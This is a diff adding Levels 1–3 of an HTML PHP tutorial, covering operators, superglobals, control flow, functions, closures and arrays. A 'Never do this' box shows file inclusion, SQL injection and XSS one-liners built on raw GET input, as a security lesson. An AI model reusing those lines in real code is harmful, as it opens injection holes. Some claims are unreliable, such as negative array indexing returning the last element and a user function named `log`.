+$a &amp;&amp; $b   // AND (short-circuits)
+$a || $b   // OR (short-circuits)
+!$a        // NOT
+
+// Word forms (lower precedence)
+$a and $b
+$a or $b
+$a xor $b
+?&gt;</code></pre>
+
+<div class="note">
+<code>&amp;&amp;</code> and <code>and</code> are <strong>not</strong> the same — <code>&amp;&amp;</code> has higher precedence than <code>=</code>, while <code>and</code> has lower. This causes subtle bugs:
+<pre style="margin-top:8px;"><code>$result = true &amp;&amp; false;  // $result = false
+$result = true and false;  // $result = true   (assignment happens first!)</code></pre>
+</div>
+
+<h3>Null Coalescing &amp; Nullsafe</h3>
+
+<pre><code>&lt;?php
+// Null coalescing (??) — returns right side if left is null or undefined
+$name = $_GET['name'] ?? 'Guest';
+$config = $config ?? [];
+
+// Chained
+$value = $a ?? $b ?? $c ?? 'default';
+
+// Nullsafe (?-&gt;) — PHP 8+
+$city = $user?-&gt;getAddress()?-&gt;city;
+// If $user is null, the whole expression returns null without error
+// Without this operator: $user-&gt;getAddress()-&gt;city  → Fatal error if $user null
+?&gt;</code></pre>
+
+<h3>Bitwise Operators</h3>
+
+<pre><code>&lt;?php
+$a &amp; $b   // AND
+$a | $b   // OR
+$a ^ $b   // XOR
+~$a       // NOT
+$a &lt;&lt; 2   // left shift
+$a &gt;&gt; 2   // right shift
+
+// Common use: permission flags
+const PERM_READ  = 0b0001;   // 1
+const PERM_WRITE = 0b0010;   // 2
+const PERM_EXEC  = 0b0100;   // 4
+
+$perms = PERM_READ | PERM_WRITE;   // 3
+if ($perms &amp; PERM_READ) echo "Can read";
+?&gt;</code></pre>
+
+<h3>Error Suppression (Avoid)</h3>
+
+<div class="security">
+The <code>@</code> operator suppresses error output:
+<pre style="margin-top:8px;"><code>$x = @file_get_contents("missing.txt");  // no warning</code></pre>
+This is <strong>not</strong> error handling. It hides the symptom while the bug remains. Never use <code>@</code> in modern PHP. Use proper try/catch and error reporting.
+</div>
+
+<h2>1.7 Superglobals</h2>
+
+<div class="theory">
+PHP automatically populates <strong>nine</strong> arrays on every request. They are called "superglobals" because they're accessible from anywhere — inside functions, inside classes, inside closures — without any <code>global</code> keyword. They represent the entire input/output environment of the current request.
+</div>
+
+<table>
+<tr><th>Superglobal</th><th>Contains</th><th>Source</th></tr>
+<tr><td><code>$_GET</code></td><td>URL query string parameters</td><td><code>?a=1&amp;b=2</code></td></tr>
+<tr><td><code>$_POST</code></td><td>Form body (application/x-www-form-urlencoded, multipart)</td><td><code>&lt;form method="post"&gt;</code></td></tr>
+<tr><td><code>$_REQUEST</code></td><td>Merge of GET + POST + COOKIE (order depends on <code>request_order</code> ini)</td><td>—</td></tr>
+<tr><td><code>$_COOKIE</code></td><td>Client-sent cookies</td><td>Browser storage</td></tr>
+<tr><td><code>$_SESSION</code></td><td>Server-side session data</td><td>Populated after <code>session_start()</code></td></tr>
+<tr><td><code>$_FILES</code></td><td>Uploaded files metadata</td><td><code>&lt;input type="file"&gt;</code></td></tr>
+<tr><td><code>$_SERVER</code></td><td>Server info: method, path, headers, IP</td><td>Web server</td></tr>
+<tr><td><code>$_ENV</code></td><td>Environment variables</td><td>Shell / .env</td></tr>
+<tr><td><code>$GLOBALS</code></td><td>All global-scope variables</td><td>Interpreter</td></tr>
+</table>
+
+<h3>Common Uses</h3>
+
+<pre><code>&lt;?php
+// GET
+$page = $_GET['page'] ?? 'home';
+
+// POST
+$name = $_POST['name'] ?? '';
+
+// SERVER
+$method = $_SERVER['REQUEST_METHOD'];   // GET, POST, etc.
+$ip     = $_SERVER['REMOTE_ADDR'];
+$ua     = $_SERVER['HTTP_USER_AGENT'];
+$path   = $_SERVER['REQUEST_URI'];
+
+// FILES
+$file = $_FILES['avatar'];   // ['name', 'type', 'tmp_name', 'error', 'size']
+
+// SESSION
+session_start();
+$_SESSION['user_id'] = 42;
+?&gt;</code></pre>
+
+<div class="security">
+<strong>Rule #1 of secure PHP:</strong> every superglobal is user input. Until you validate and sanitize it, treat it as malicious. Every major PHP vulnerability class — SQL injection, XSS, file inclusion, command injection — originates from code that trusted a superglobal directly.
+<br><br>
+<strong>Never do this:</strong>
+<pre style="margin-top:8px;"><code>include($_GET['page']);                          // LFI/RFI
+$q = "SELECT * FROM users WHERE id = " . $_GET['id']; // SQLi
+echo "Hello " . $_GET['name'];                   // XSS</code></pre>
+Each level from here on shows the mitigation for its relevant superglobal risk.
+</div>
+
+<h2>1.8 Level 1 Practice</h2>
+
+<div class="practice">
+<ol>
+  <li>Write a script that prints "Hello, World" five times using a loop.</li>
+  <li>Create variables of every data type (int, float, string, bool, null, array) and <code>var_dump()</code> each one.</li>
+  <li>Build a URL-driven calculator: <code>?a=5&amp;b=3&amp;op=add</code> should output 8. Support add, subtract, multiply, divide. Handle division by zero.</li>
+  <li>Print the current server time in three timezones using <code>DateTime</code> and <code>DateTimeZone</code>.</li>
+  <li>Write a script that lists every superglobal's key/value pairs on the current request, using <code>foreach ($_SERVER as $k =&gt; $v)</code>.</li>
+  <li>Create a constant <code>APP_VERSION = "1.0"</code> and print it. Then try to reassign it — observe the error.</li>
+</ol>
+</div>
+
+<div class="page-break"></div>
+
+<!-- ==================================================== -->
+<!--                     LEVEL 2                         -->
+<!-- ==================================================== -->
+<h1>Level 2 — Control Flow &amp; Functions <span class="badge">BEGINNER</span></h1>
+
+<h2>2.1 Conditionals</h2>
+
+<div class="theory">
+Conditionals control which code runs based on a condition. PHP offers the classic <code>if / elseif / else</code> chain plus several shorthand forms: ternary (<code>?:</code>), Elvis (<code>?:</code> without middle), null coalescing (<code>??</code>), and <code>match</code> (PHP 8). Each has a specific use case.
+</div>
+
+<div class="analogy">
+<p>An <code>if</code> statement is a fork in the road. You drive up, check a sign ("Is the user logged in?"). If yes, you take the left path. If no, you take the right. <code>elseif</code> adds a third sign further down, and <code>else</code> is the path you take if no sign matched. <code>match</code> is like a train station — you pick the platform by exact destination.</p>
+</div>
+
+<h3>Basic if / elseif / else</h3>
+
+<pre><code>&lt;?php
+$score = 87;
+
+if ($score &gt;= 90) {
+    $grade = "A";
+} elseif ($score &gt;= 80) {
+    $grade = "B";
+} elseif ($score &gt;= 70) {
+    $grade = "C";
+} else {
+    $grade = "F";
+}
+
+echo "Grade: $grade\n";     // Grade: B
+?&gt;</code></pre>
+
+<h3>Alternative Syntax (for templates)</h3>
+
+<div class="theory">
+When mixing PHP with HTML, the brace syntax gets ugly. PHP's alternative syntax replaces <code>{</code> with <code>:</code> and <code>}</code> with <code>endif;</code>, <code>endforeach;</code>, etc.
+</div>
+
+<pre><code>&lt;?php $user = "Devils"; ?&gt;
+&lt;?php if ($user === "Devils"): ?&gt;
+    &lt;p&gt;Welcome, admin!&lt;/p&gt;
+&lt;?php elseif ($user === "Guest"): ?&gt;
+    &lt;p&gt;Welcome, guest.&lt;/p&gt;
+&lt;?php else: ?&gt;
+    &lt;p&gt;Unknown user.&lt;/p&gt;
+&lt;?php endif; ?&gt;</code></pre>
+
+<h3>Ternary Operator</h3>
+
+<div class="theory">
+The ternary operator <code>condition ? true_value : false_value</code> is a shorthand for simple if/else. Use it only when both branches are short. Nested ternaries are unreadable — since PHP 8, they require explicit parentheses.
+</div>
+
+<pre><code>&lt;?php
+$age = 20;
+$status = $age &gt;= 18 ? "adult" : "minor";
+echo $status;   // adult
+
+// Since PHP 8, nested ternary needs parentheses
+$category = ($age &lt; 13) ? "child" : (($age &lt; 20) ? "teen" : "adult");
+?&gt;</code></pre>
+
+<h3>Elvis Operator (<code>?:</code>)</h3>
+
+<div class="theory">
+The Elvis operator <code>a ?: b</code> is ternary without the middle. It returns <code>a</code> if <code>a</code> is truthy, otherwise <code>b</code>. Useful for defaults, but be careful — it checks truthiness, not existence.
+</div>
+
+<pre><code>&lt;?php
+$name = $userName ?: "Guest";
+
+// If $userName is "0", it's falsy — this returns "Guest"!
+// That's usually not what you want. See Security Note below.
+?&gt;</code></pre>
+
+<div class="security">
+The Elvis operator uses loose truthiness. <code>"0"</code>, <code>0</code>, <code>""</code>, <code>[]</code>, <code>null</code>, and <code>false</code> are all falsy. If a user submits the string <code>"0"</code> as their username, <code>$userName ?: "Guest"</code> returns <code>"Guest"</code> — not <code>"0"</code>. This has caused authentication and ID-mapping bugs.
+<br><br>
+<strong>Safer alternative:</strong> use <code>??</code> (null coalescing), which only checks for <code>null</code> and undefined.
+</div>
+
+<h3>Null Coalescing Operator (<code>??</code>)</h3>
+
+<div class="theory">
+<code>a ?? b</code> returns <code>a</code> if it exists and is not <code>null</code>. Otherwise, returns <code>b</code>. This is the correct operator for defaults from user input, because <code>"0"</code> is a valid value.
+</div>
+
+<pre><code>&lt;?php
+$page = $_GET['page'] ?? 'home';
+
+// Chained fallbacks
+$name = $_GET['name'] ?? $_POST['name'] ?? $user-&gt;name ?? 'Guest';
+
+// Equivalent to (but cleaner than):
+$page = isset($_GET['page']) ? $_GET['page'] : 'home';
+?&gt;</code></pre>
+
+<h3>Match Expression (PHP 8)</h3>
+
+<div class="theory">
+<code>match</code> is the modern replacement for <code>switch</code> in most cases. Key differences:
+</div>
+
+<ul>
+  <li>Uses <strong>strict comparison</strong> (<code>===</code>) — no type juggling</li>
+  <li><strong>Returns a value</strong> — it's an expression, not a statement</li>
+  <li><strong>No fallthrough</strong> — no <code>break</code> needed</li>
+  <li>If no case matches and there's no <code>default</code>, it throws <code>UnhandledMatchError</code></li>
+</ul>
+
+<pre><code>&lt;?php
+$code = 404;
+
+$message = match($code) {
+    200, 201, 204 =&gt; "Success",
+    301, 302      =&gt; "Redirect",
+    400, 401, 403 =&gt; "Client error",
+    500, 502, 503 =&gt; "Server error",
+    default       =&gt; "Unknown status",
+};
+
+echo $message;   // Client error
+
+// Match with conditions (use true as subject)
+$category = match(true) {
+    $age &lt; 13   =&gt; "child",
+    $age &lt; 20   =&gt; "teen",
+    $age &lt; 65   =&gt; "adult",
+    default     =&gt; "senior",
+};
+?&gt;</code></pre>
+
+<h2>2.2 Loops</h2>
+
+<div class="theory">
+A loop repeats a block of code. PHP has four loop constructs, each suited to a different situation.
+</div>
+
+<table>
+<tr><th>Loop</th><th>Use When</th></tr>
+<tr><td><code>for</code></td><td>You know the number of iterations</td></tr>
+<tr><td><code>foreach</code></td><td>Iterating arrays and objects</td></tr>
+<tr><td><code>while</code></td><td>Loop until a condition fails (may run zero times)</td></tr>
+<tr><td><code>do...while</code></td><td>Same as while, but body runs at least once</td></tr>
+</table>
+
+<h3>for Loop</h3>
+
+<pre><code>&lt;?php
+for ($i = 0; $i &lt; 10; $i++) {
+    echo "$i ";
+}
+// 0 1 2 3 4 5 6 7 8 9
+
+// Multiple expressions
+for ($i = 0, $j = 10; $i &lt; $j; $i++, $j--) {
+    echo "$i-$j ";
+}
+?&gt;</code></pre>
+
+<h3>foreach Loop</h3>
+
+<div class="theory">
+<code>foreach</code> is PHP's array iterator. It iterates over both keys and values. By default, it iterates over a <em>copy</em> of the array — modifying <code>$value</code> inside the loop doesn't change the array. To modify, use <code>&amp;$value</code> (by reference).
+</div>
+
+<pre><code>&lt;?php
+$fruits = ["apple", "banana", "cherry"];
+
+// Values only
+foreach ($fruits as $fruit) {
+    echo "$fruit\n";
+}
+
+// Keys and values
+$user = ["name" =&gt; "Devils", "age" =&gt; 22];
+foreach ($user as $key =&gt; $value) {
+    echo "$key = $value\n";
+}
+
+// Modify by reference (rare — be careful)
+$nums = [1, 2, 3];
+foreach ($nums as &amp;$n) {
+    $n *= 2;
+}
+unset($n);   // IMPORTANT: unset the reference after loop
+print_r($nums);   // [2, 4, 6]
+?&gt;</code></pre>
+
+<div class="security">
+If you forget <code>unset($n)</code> after a foreach-by-reference loop, <code>$n</code> remains a reference to the last element of the array. Any subsequent use of <code>$n</code> elsewhere silently modifies that element. This has caused bugs in production code that took weeks to find.
+</div>
+
+<h3>while and do...while</h3>
+
+<pre><code>&lt;?php
+$i = 0;
+while ($i &lt; 5) {
+    echo "$i ";
+    $i++;
+}
+
+// do...while runs at least once
+$i = 10;
+do {
+    echo "Ran once\n";
+    $i++;
+} while ($i &lt; 5);
+?&gt;</code></pre>
+
+<h3>break and continue</h3>
+
+<div class="theory">
+<code>break</code> exits the loop entirely. <code>continue</code> skips the rest of the current iteration and moves to the next. Both accept an optional number to specify how many levels of nested loops to affect.
+</div>
+
+<pre><code>&lt;?php
+// Skip even numbers
+for ($i = 1; $i &lt;= 10; $i++) {
+    if ($i % 2 === 0) continue;
+    echo "$i ";
+}
+// 1 3 5 7 9
+
+// Multi-level break
+foreach ([[1,2],[3,4],[5,6]] as $row) {
+    foreach ($row as $cell) {
+        if ($cell === 4) break 2;   // break BOTH loops
+        echo "$cell ";
+    }
+}
+// 1 2 3
+?&gt;</code></pre>
+
+<h2>2.3 Functions</h2>
+
+<div class="theory">
+A <strong>function</strong> is a named, reusable block of code. Functions let you avoid repetition, isolate logic, and test units independently. In PHP, functions are declared with <code>function</code> and can have typed parameters and typed return values.
+</div>
+
+<div class="analogy">
+<p>A function is like a vending machine. You give it input (coins — arguments), it does something internally (dispenses), and gives you output (a snack — return value). You don't need to know what happens inside; you just trust the interface.</p>
+</div>
+
+<h3>Basic Function Declaration</h3>
+
+<pre><code>&lt;?php
+function greet(string $name, string $greeting = "Hello"): string {
+    return "$greeting, $name";
+}
+
+echo greet("Devils");                 // Hello, Devils
+echo greet("Devils", "Yo");           // Yo, Devils
+echo greet(greeting: "Hi", name: "X"); // Named arguments (PHP 8)
+?&gt;</code></pre>
+
+<h3>Strict Typing</h3>
+
+<div class="theory">
+By default, PHP coerces arguments to match the declared types. Calling <code>add("5", "3")</code> on a function declared <code>add(int $a, int $b)</code> works — the strings are coerced to integers. To disable coercion, add <code>declare(strict_types=1)</code> as the very first statement in the file.
+</div>
+
+<pre><code>&lt;?php
+declare(strict_types=1);
+
+function add(int $a, int $b): int {
+    return $a + $b;
+}
+
+add(5, 3);      // OK
+add("5", "3");  // TypeError — good!
+?&gt;</code></pre>
+
+<h3>Type Declarations Reference</h3>
+
+<table>
+<tr><th>Type</th><th>Meaning</th><th>Example</th></tr>
+<tr><td><code>int</code>, <code>float</code>, <code>string</code>, <code>bool</code></td><td>Scalar types</td><td><code>function f(int $x)</code></td></tr>
+<tr><td><code>array</code></td><td>Any array</td><td><code>function f(array $a)</code></td></tr>
+<tr><td><code>object</code></td><td>Any object</td><td><code>function f(object $o)</code></td></tr>
+<tr><td><code>?int</code></td><td>Int or null (nullable)</td><td><code>function f(?int $x)</code></td></tr>
+<tr><td><code>int|string</code></td><td>Union (PHP 8)</td><td><code>function f(int|string $x)</code></td></tr>
+<tr><td><code>Countable&amp;ArrayAccess</code></td><td>Intersection (PHP 8.1)</td><td><code>function f(Countable&amp;ArrayAccess $x)</code></td></tr>
+<tr><td><code>void</code></td><td>Returns nothing</td><td><code>function f(): void</code></td></tr>
+<tr><td><code>never</code></td><td>Never returns (throws/exits)</td><td><code>function f(): never</code></td></tr>
+<tr><td><code>mixed</code></td><td>Any value (PHP 8)</td><td><code>function f(mixed $x)</code></td></tr>
+<tr><td><code>self</code>, <code>static</code>, <code>parent</code></td><td>Class references</td><td><code>function f(): self</code></td></tr>
+</table>
+
+<h3>Variadic Functions</h3>
+
+<pre><code>&lt;?php
+function sum(int ...$nums): int {
+    return array_sum($nums);
+}
+
+echo sum(1, 2, 3, 4);       // 10
+echo sum();                 // 0
+
+// Spread from array (PHP 5.6+)
+$args = [1, 2, 3];
+echo sum(...$args);         // 6
+
+// Mixed: fixed + variadic
+function log(string $level, string ...$messages): void {
+    foreach ($messages as $m) echo "[$level] $m\n";
+}
+log("INFO", "started", "connected", "ready");
+?&gt;</code></pre>
+
+<h3>Return Types &amp; Early Return</h3>
+
+<pre><code>&lt;?php
+function findUser(int $id): ?array {
+    if ($id &lt;= 0) return null;         // early return
+    if ($id &gt; 9999) return null;
+
+    // Simulated lookup
+    return ['id' =&gt; $id, 'name' =&gt; 'Devils'];
+}
+?&gt;</code></pre>
+
+<h2>2.4 Closures &amp; Arrow Functions</h2>
+
+<div class="theory">
+An <strong>anonymous function</strong> (or <strong>closure</strong>) is a function without a name. It's treated as a value — you can store it in a variable, pass it as an argument, or return it from another function. Closures are the backbone of functional-style PHP (used heavily in <code>array_map</code>, <code>usort</code>, middleware, etc.).
+</div>
+
+<h3>Basic Closure</h3>
+
+<pre><code>&lt;?php
+$greet = function(string $name): string {
+    return "Hello, $name";
+};
+
+echo $greet("Devils");   // Hello, Devils
+?&gt;</code></pre>
+
+<h3>Closures and Scope (<code>use</code>)</h3>
+
+<div class="theory">
+A closure does <strong>not</strong> see variables from the enclosing scope by default. You must explicitly import them with the <code>use</code> keyword. By default, imports are <strong>by value</strong> — a copy is captured at the moment the closure is created. To share the actual variable, import <strong>by reference</strong> with <code>&amp;</code>.
+</div>
+
+<pre><code>&lt;?php
+$factor = 10;
+
+// By value
+$mult = function($n) use ($factor) {
+    return $n * $factor;
+};
+
+// By reference
+$count = 0;
+$inc = function() use (&amp;$count) {
+    $count++;
+};
+
+$inc(); $inc();
+echo $count;   // 2
+
+// If we had captured by value, $count would still be 0
+?&gt;</code></pre>
+
+<h3>Arrow Functions (PHP 7.4+)</h3>
+
+<div class="theory">
+Arrow functions are a shorter syntax for simple closures. They <strong>auto-capture</strong> variables from the enclosing scope (by value) — no <code>use</code> needed. They contain a single expression and implicitly return its value.
+</div>
+
+<pre><code>&lt;?php
+$factor = 10;
+
+// Arrow function — auto-captures $factor
+$mult = fn($n) =&gt; $n * $factor;
+
+echo $mult(5);   // 50
+
+// Common use: array_map, array_filter
+$nums = [1, 2, 3, 4, 5];
+$doubled = array_map(fn($n) =&gt; $n * 2, $nums);
+$evens   = array_filter($nums, fn($n) =&gt; $n % 2 === 0);
+?&gt;</code></pre>
+
+<h3>First-Class Callable Syntax (PHP 8.1+)</h3>
+
+<div class="theory">
+Since PHP 8.1, you can get a closure for any function or method using <code>...</code>:
+</div>
+
+<pre><code>&lt;?php
+$len = strlen(...);
+echo $len("hello");       // 5
+
+$trim = trim(...);
+$mapper = array_map($len, ["a", "bb", "ccc"]);   // [1, 2, 3]
+
+// Method
+$obj = new DateTime();
+$format = $obj-&gt;format(...);
+echo $format("Y-m-d");
+?&gt;</code></pre>
+
+<h2>2.5 References</h2>
+
+<div class="theory">
+PHP uses <strong>copy-on-write</strong> for arrays and objects. When you assign one variable to another, no data is copied yet — both names point to the same underlying value. The copy happens only when one of them is modified.
+</div>
+
+<div class="analogy">
+<p>Imagine a shared document. You and a colleague both have "copies" — but actually you're both editing the same file. The moment one of you types something, the system makes a private copy for the other person. That's copy-on-write. Adding <code>&amp;</code> is like saying "no — we always share the same file, no private copies."</p>
+</div>
+
+<h3>Simple Assignment vs Reference</h3>
+
+<pre><code>&lt;?php
+$a = [1, 2, 3];
+$b = $a;         // logical copy (copy-on-write)
+$b[] = 4;        // $b is now [1,2,3,4], $a unchanged
+
+$c = &amp;$a;        // reference — both names for same value
+$c[] = 5;        // $a is now [1,2,3,5]
+?&gt;</code></pre>
+
+<h3>Pass by Reference</h3>
+
+<pre><code>&lt;?php
+function increment(&amp;$n): void {
+    $n++;
+}
+
+$x = 5;
+increment($x);
+echo $x;   // 6
+
+// Without reference, $x would still be 5
+?&gt;</code></pre>
+
+<h3>Return by Reference (Rare)</h3>
+
+<pre><code>&lt;?php
+class Registry {
+    private array $data = [];
+
+    public function &amp;get(string $key) {
+        return $this-&gt;data[$key];
+    }
+}
+
+$r = new Registry();
+$val = &amp;$r-&gt;get('x');
+$val = 100;
+// Now $r-&gt;data['x'] === 100
+?&gt;</code></pre>
+
+<div class="note">
+Return-by-reference is rarely needed and often a code smell. Modern PHP code uses objects (which are already passed by handle) rather than returning references to arrays.
+</div>
+
+<h2>2.6 Level 2 Practice</h2>
+
+<div class="practice">
+<ol>
+  <li><strong>FizzBuzz:</strong> Print numbers 1 to 100. For multiples of 3, print "Fizz". For multiples of 5, print "Buzz". For multiples of both, print "FizzBuzz".</li>
+  <li><strong>Prime checker:</strong> Write a function <code>isPrime(int $n): bool</code> that returns true if <code>$n</code> is a prime number. Test it on the first 20 primes.</li>
+  <li><strong>Fibonacci:</strong> Write two functions — <code>fibRecursive(int $n)</code> and <code>fibIterative(int $n)</code>. Compare performance for n=30. Why is one faster?</li>
+  <li><strong>BMI calculator:</strong> Given weight (kg) and height (m), compute BMI. Use <code>match(true)</code> to categorize: &lt;18.5 underweight, 18.5-24.9 normal, 25-29.9 overweight, ≥30 obese.</li>
+  <li><strong>Custom <code>array_map</code>:</strong> Implement your own <code>my_map(array $arr, callable $fn): array</code> that returns a new array where each element is <code>$fn($value)</code>.</li>
+  <li><strong>Closure counter:</strong> Create a function <code>makeCounter()</code> that returns a closure. Each time you call the closure, it increments an internal counter and returns the new value. The counter must persist between calls (use <code>use (&amp;$count)</code>).</li>
+  <li><strong>Match router:</strong> Given <code>$_SERVER['REQUEST_METHOD']</code>, use <code>match</code> to return the correct handler name for GET, POST, PUT, DELETE, and throw an error for anything else.</li>
+</ol>
+</div>
+
+<div class="page-break"></div>
+
+<h1 style="text-align:center; padding:80px 20px; border:none; color:#9c27b0;">✓  END OF PART 1</h1>
+<p style="text-align:center; color:#888; font-size:1.05em;">
+Levels 1 &amp; 2 complete. Level 3 &amp; 4 arrive in <strong>Part 2</strong>.<br>
+When all 4 parts are collected, replace this section with Part 2 content and print once.
+</p>
+
+<!-- ==================================================== -->
+<!--                     LEVEL 3                         -->
+<!-- ==================================================== -->
+<h1>Level 3 — Arrays, Strings, Regex <span class="badge int">INTERMEDIATE</span></h1>
+
+<h2>3.1 Arrays Deep Dive</h2>
+
+<div class="theory">
+PHP arrays are <strong>ordered hash maps</strong> — this one sentence explains almost everything interesting about them. In most languages you have two separate types: a <em>list</em> (indexed by sequential integers) and a <em>dictionary / map</em> (indexed by keys). PHP merges both into a single type: the array. That means you can insert string keys and integer keys into the same array, mix them, sort them, and treat the whole thing like a key-value store <em>or</em> a list depending on context.
+</div>
+
+<div class="analogy">
+<p>Think of a PHP array as a filing cabinet with labeled drawers. In most languages, you're forced to choose — either you have sequential drawers numbered 0, 1, 2, 3 or you have drawers labeled by name. PHP lets you mix both. Drawer 0, drawer "username", drawer 5, drawer "email" — all in one cabinet. You can look things up by number or by label, and the order you inserted them is preserved.</p>
+</div>
+
+<h3>Creating Arrays</h3>
+
+<pre><code>&lt;?php
+// Short syntax (PHP 5.4+, always use this)
+$indexed = [1, 2, 3, 4];
+$map     = ["name" =&gt; "Devils", "age" =&gt; 22, "active" =&gt; true];
+$nested  = [[1, 2], [3, 4], [5, 6]];
+$mixed   = [0 =&gt; "a", "x" =&gt; "b", 5 =&gt; "c", "hello"];
+
+// Old syntax (still valid, avoid)
+$old = array(1, 2, 3);
+
+// Empty array
+$empty = [];
+$empty2 = array();
+?&gt;</code></pre>
+
+<h3>Accessing &amp; Modifying</h3>
+
+<pre><code>&lt;?php
+$fruits = ["apple", "banana", "cherry"];
+
+// Read
+echo $fruits[0];        // apple
+echo $fruits[2];        // cherry
+echo $fruits[-1];       // cherry (negative indexing, PHP 7.1+)
+
+// Modify
+$fruits[1] = "blueberry";
+
+// Append (push)
+$fruits[] = "date";
+
+// Add with explicit key
+$fruits[10] = "elderberry";
+
+// Remove
+unset($fruits[0]);
+// Note: unset does NOT reindex. $fruits[1] is still "blueberry"
+
+// Reindex after unset
+$fruits = array_values($fruits);
+
+// Check existence
+if (isset($fruits[2])) { /* ... */ }
+if (array_key_exists(2, $fruits)) { /* ... */ }
+?&gt;</code></pre>
+
+<div class="note">
+<code>isset()</code> returns <strong>false</strong> for keys whose value is <code>null</code>. <code>array_key_exists()</code> returns <strong>true</strong> even if the value is <code>null</code>. Use the right one depending on your intent.
+</div>
+
+<h3>Multidimensional Arrays</h3>
+
+<pre><code>&lt;?php
+$users = [
+    ["id" =&gt; 1, "name" =&gt; "Devils", "age" =&gt; 22],
+    ["id" =&gt; 2, "name" =&gt; "Bhai",   "age" =&gt; 25],
+    ["id" =&gt; 3, "name" =&gt; "Rise",   "age" =&gt; 20],
+];
+
+// Access
+echo $users[1]["name"];   // Bhai
+
+// Loop
+foreach ($users as $user) {
+    echo "{$user['name']} is {$user['age']}\n";
+}
+?&gt;</code></pre>
+
+<h3>Array Destructuring</h3>
+
+<pre><code>&lt;?php
+// Simple
+[$a, $b] = [1, 2];
+echo "$a $b";   // 1 2
+
+// Skip elements
+[$first, , $third] = ["a", "b", "c"];
+echo $third;    // c
+
+// Associative
+["name" =&gt; $n, "age" =&gt; $a] = ["name" =&gt; "Devils", "age" =&gt; 22];
+echo $n;
+
+// Nested
+[[$x1, $x2], [$y1, $y2]] = [[1, 2], [3, 4]];
+
+// In foreach
+foreach ($users as ["name" =&gt; $name, "age" =&gt; $age]) {
+    echo "$name ($age)\n";
+}
+
+// Swap without temp
+[$x, $y] = [$y, $x];
+?&gt;</code></pre>
+
+<h3>The Spread Operator</h3>
+
+<div class="theory">
+Introduced for arrays in PHP 7.4, the spread operator <code>...</code> unpacks one array into another. It reindexes integer keys but preserves string keys (from PHP 8.1).
+</div>
+
+<pre><code>&lt;?php
+$nums = [1, 2, 3];
+$more = [...$nums, 4, 5];   // [1, 2, 3, 4, 5]
+
+$a = ["x" =&gt; 1, "y" =&gt; 2];
+$b = ["y" =&gt; 3, "z" =&gt; 4];
+$c = [...$a, ...$b];        // ["x" =&gt; 1, "y" =&gt; 3, "z" =&gt; 4]
+?&gt;</code></pre>
+
+<h2>3.2 Essential Array Functions</h2>
+
+<div class="theory">
+PHP ships with <strong>80+ array functions</strong>. You don't need to memorize them all, but the ~25 below cover 95% of real code. Group them mentally: <em>inspection</em> (count, exists), <em>transformation</em> (map, filter, reduce), <em>combination</em> (merge, combine), <em>slicing</em> (slice, splice, chunk), <em>sorting</em> (sort, usort), and <em>extraction</em> (keys, values, column).
+</div>
+
+<h3>Inspection</h3>
+
+<pre><code>&lt;?php
+$arr = [3, 1, 4, 1, 5, 9, 2, 6];
+
+count($arr);                        // 8
+array_sum($arr);                    // 31
+array_product($arr);                // 6480
+min($arr); max($arr);               // 1, 9
+
+in_array(4, $arr);                  // true
+in_array("4", $arr, strict: true);  // false (strict mode)
+array_search(5, $arr);              // index 4
+array_key_exists(0, $arr);          // true
+?&gt;</code></pre>
+
+<div class="security">
+<code>in_array()</code> without <code>strict: true</code> uses loose comparison (<code>==</code>). This means <code>in_array("admin", [0, 1, 2])</code> can return <code>true</code> in PHP 7 because <code>"admin" == 0</code>. Always pass <code>strict: true</code> when checking user input against a whitelist of allowed values.
+</div>
+
+<h3>Transformation — map, filter, reduce</h3>
+
+<div class="theory">
+These three functions form the heart of functional-style PHP. <code>array_map</code> transforms every element. <code>array_filter</code> keeps elements that pass a test. <code>array_reduce</code> collapses an array to a single value.
+</div>
+
+<pre><code>&lt;?php
+$nums = [1, 2, 3, 4, 5];
+
+// map — apply function to every element
+$doubled = array_map(fn($n) =&gt; $n * 2, $nums);
+// [2, 4, 6, 8, 10]
+
+// map with multiple arrays
+$sums = array_map(fn($a, $b) =&gt; $a + $b, [1,2,3], [10,20,30]);
+// [11, 22, 33]
+
+// filter — keep items where callback returns true
+$evens = array_filter($nums, fn($n) =&gt; $n % 2 === 0);
+// [2, 4] (keys preserved! — index 1 and 3)
+
+// Reindex after filter
+$evens = array_values($evens);
+// [2, 4]
+
+// filter with keys (ARRAY_FILTER_USE_KEY)
+$byKey = array_filter(["a" =&gt; 1, "b" =&gt; 2], fn($k) =&gt; $k === "a", ARRAY_FILTER_USE_KEY);
+
+// reduce — collapse to single value
+$sum = array_reduce($nums, fn($acc, $n) =&gt; $acc + $n, 0);
+// 15
+?&gt;</code></pre>
+
+<h3>Combination — merge, combine, flip</h3>
+
+<pre><code>&lt;?php
+$a = ["x" =&gt; 1, "y" =&gt; 2];
+$b = ["y" =&gt; 3, "z" =&gt; 4];
+
+// merge — later keys overwrite
+$c = array_merge($a, $b);
+// ["x" =&gt; 1, "y" =&gt; 3, "z" =&gt; 4]
+
+// merge_recursive — deep merge
+$d = array_merge_recursive($a, $b);
+// ["x" =&gt; 1, "y" =&gt; [2, 3], "z" =&gt; 4]
+
+// combine — keys from first, values from second
+$keys = ["name", "age"];
+$vals = ["Devils", 22];
+$user = array_combine($keys, $vals);
+// ["name" =&gt; "Devils", "age" =&gt; 22]
+
+// flip — swap keys and values
+$flipped = array_flip(["a" =&gt; 1, "b" =&gt; 2]);
+// [1 =&gt; "a", 2 =&gt; "b"]
+
+// fill — array of repeated value
+array_fill(0, 5, "x");   // ["x", "x", "x", "x", "x"]
+
+// range — numeric or char sequence
+range(1, 10);            // [1..10]
+range('a', 'e');         // ["a","b","c","d","e"]
+?&gt;</code></pre>
+
+<h3>Slicing &amp; Splicing</h3>
+
+<pre><code>&lt;?php
+$arr = ["a", "b", "c", "d", "e"];
+
+// slice — non-destructive, returns a portion
+array_slice($arr, 1, 3);        // ["b", "c", "d"]
+array_slice($arr, -2);          // ["d", "e"]
+array_slice($arr, 1, -1);       // ["b", "c", "d"]
+
+// splice — destructive, removes/replaces and returns removed
+$removed = array_splice($arr, 1, 2, ["X", "Y"]);
+// $arr is now ["a", "X", "Y", "d", "e"]
+// $removed is ["b", "c"]
+
+// chunk — split into groups
+array_chunk([1,2,3,4,5], 2);    // [[1,2],[3,4],[5]]
+?&gt;</code></pre>
+
+<h3>Sorting</h3>
+
+<div class="theory">
+PHP has over 15 sorting functions. The critical detail: some <strong>preserve keys</strong> (asort, arsort, ksort) and some <strong>reindex</strong> (sort, rsort). And some sort by value while others sort by key.
+</div>
+
+<table>
+<tr><th>Function</th><th>Sorts By</th><th>Preserves Keys?</th></tr>
+<tr><td><code>sort()</code></td><td>value, ascending</td><td>No</td></tr>
